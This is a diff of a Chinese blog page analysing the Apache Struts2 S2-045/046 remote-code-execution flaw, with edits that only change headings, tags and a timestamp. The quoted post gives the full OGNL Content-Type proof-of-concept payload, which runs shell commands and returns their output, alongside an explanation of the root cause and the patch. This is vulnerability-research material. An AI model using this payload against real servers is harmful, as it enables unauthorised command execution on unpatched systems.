@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://shaomi.github.io/2017/09/11/Struts2-045-046分析/./1505114107282.png">
 <meta property="og:image" content="https://shaomi.github.io/2017/09/11/Struts2-045-046分析/./1505114125419.png">
 <meta property="og:image" content="https://shaomi.github.io/2017/09/11/Struts2-045-046分析/./1505114128852.png">
-<meta property="og:updated_time" content="2017-09-11T08:18:06.874Z">
+<meta property="og:updated_time" content="2017-09-11T08:21:05.600Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Struts2-045/046分析">
 <meta name="twitter:description" content="最近052出来后，想起之前算是比较完整地分析过045，所以重新整理下罢了
@@ -180,12 +180,12 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>　　最近052出来后，想起之前算是比较完整地分析过045，所以重新整理下罢了</p>
-<h4 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h4><p>　　　直接摘选cve的描述：<br>　　　It is possible to perform a RCE attack with a malicious Content-Type value. If the <code>Content-Type</code> value isn’t valid an exception is thrown which is then used to display an error message to a user.</p>
+<h3 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h3><p>　　　直接摘选cve的描述：<br>　　　It is possible to perform a RCE attack with a malicious Content-Type value. If the <code>Content-Type</code> value isn’t valid an exception is thrown which is then used to display an error message to a user.</p>
 <a id="more"></a>
-<h4 id="0x01POC关键点"><a href="#0x01POC关键点" class="headerlink" title="0x01POC关键点"></a>0x01POC关键点</h4><blockquote>
+<h3 id="0x01POC关键点"><a href="#0x01POC关键点" class="headerlink" title="0x01POC关键点"></a>0x01POC关键点</h3><blockquote>
 <p>Content-Type =<br><code>%{(#nike=&#39;multipart/form-data&#39;).</code><br>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).<br>(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=’whoami’).(#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{‘/bin/bash’,’-c’,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</p>
 </blockquote>
-<h4 id="0x02漏洞分析"><a href="#0x02漏洞分析" class="headerlink" title="0x02漏洞分析"></a>0x02漏洞分析</h4><p>　　首先，根据漏洞描述，我们可以看到有几个关键信息：</p>
+<h3 id="0x02漏洞分析"><a href="#0x02漏洞分析" class="headerlink" title="0x02漏洞分析"></a>0x02漏洞分析</h3><p>　　首先，根据漏洞描述，我们可以看到有几个关键信息：</p>
 <ol>
 <li>恶意的<code>Content-Type</code></li>
 <li><code>Content-Type</code>无效</li>
@@ -204,7 +204,7 @@
 <p>而046，网上一开是的描述是同一触发点，但不同向量。由于我的环境搭建失败，没有尝试调试，但根据一些网上的异常信息，可以得出，046与045的区别，就是在与抛出异常的位置不同，即触发异常的方式不同，但却是同一个异常处理。</p>
 <p><a href="https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a" target="_blank" rel="external">https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a</a></p>
 <p>　　这个升级后，异常处理函数中，调用findtext函数时候，没有直接传入defaultmessage参数，而是默认传入null值，使得会传入TextParseUtil的translateVariables的message不会必定不会含有ognl表达式，所以可以彻底防御该问题。</p>
-<h4 id="0x03参考文档"><a href="#0x03参考文档" class="headerlink" title="0x03参考文档"></a>0x03参考文档</h4><p><a href="https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html" target="_blank" rel="external">https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html</a></p>
+<h3 id="0x03参考文档"><a href="#0x03参考文档" class="headerlink" title="0x03参考文档"></a>0x03参考文档</h3><p><a href="https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html" target="_blank" rel="external">https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html</a></p>
 
       
 
@@ -371,6 +371,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
@@ -380,10 +384,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
